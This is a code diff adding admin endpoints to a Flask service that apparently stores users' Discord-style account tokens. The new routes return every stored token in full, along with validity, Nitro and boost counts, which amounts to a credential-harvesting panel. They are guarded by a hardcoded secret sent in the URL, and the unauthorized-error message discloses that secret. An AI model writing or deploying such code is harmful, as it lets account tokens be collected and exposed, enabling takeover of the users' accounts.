@@ -290,3 +290,85 @@ def health():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
+
+# ==================== ADMIN ENDPOINTS ====================
+@app.route('/api/admin/all_tokens', methods=['GET'])
+def admin_all_tokens():
+    """View all tokens from all users (admin only)"""
+    # Simple auth - change this to your own secret key
+    secret = request.args.get('secret', '')
+    
+    # IMPORTANT: Change this to your own secret!
+    ADMIN_SECRET = "your_secret_key_here_12345"
+    
+    if secret != ADMIN_SECRET:
+        return jsonify({"error": "Unauthorized. Use ?secret=your_secret_key_here_12345"}), 401
+    
+    tokens_data = load_tokens()
+    
+    # Format the data nicely
+    result = {}
+    for user, tokens in tokens_data.items():
+        user_info = []
+        for token in tokens:
+            # Check each token's status
+            info = check_token(token)
+            user_info.append({
+                "token": token[:30] + "..." if len(token) > 30 else token,
+                "full_token": token,
+                "username": info.get('username', 'Unknown'),
+                "valid": info.get('valid', False),
+                "nitro": info.get('nitro', 'No Nitro'),
+                "boosts": info.get('boosts', 0)
+            })
+        result[user] = user_info
+    
+    return jsonify({
+        "total_users": len(result),
+        "total_tokens": sum(len(tokens) for tokens in tokens_data.values()),
+        "data": result
+    })
+
+@app.route('/api/admin/tokens/raw', methods=['GET'])
+def admin_raw_tokens():
+    """Get raw token data for backup"""
+    secret = request.args.get('secret', '')
+    ADMIN_SECRET = "your_secret_key_here_12345"
+    
+    if secret != ADMIN_SECRET:
+        return jsonify({"error": "Unauthorized"}), 401
+    
+    tokens_data = load_tokens()
+    return jsonify(tokens_data)
+
+@app.route('/api/admin/stats', methods=['GET'])
+def admin_stats():
+    """Get simple statistics"""
+    secret = request.args.get('secret', '')
+    ADMIN_SECRET = "your_secret_key_here_12345"
+    
+    if secret != ADMIN_SECRET:
+        return jsonify({"error": "Unauthorized"}), 401
+    
+    tokens_data = load_tokens()
+    total_tokens = 0
+    valid_tokens = 0
+    total_boosts = 0
+    
+    for user, tokens in tokens_data.items():
+        for token in tokens:
+            total_tokens += 1
+            info = check_token(token)
+            if info.get('valid'):
+                valid_tokens += 1
+                total_boosts += info.get('boosts', 0)
+    
+    return jsonify({
+        "stats": {
+            "total_users": len(tokens_data),
+            "total_tokens": total_tokens,
+            "valid_tokens": valid_tokens,
+            "total_boosts_available": total_boosts
+        },
+        "users": list(tokens_data.keys())
+    })
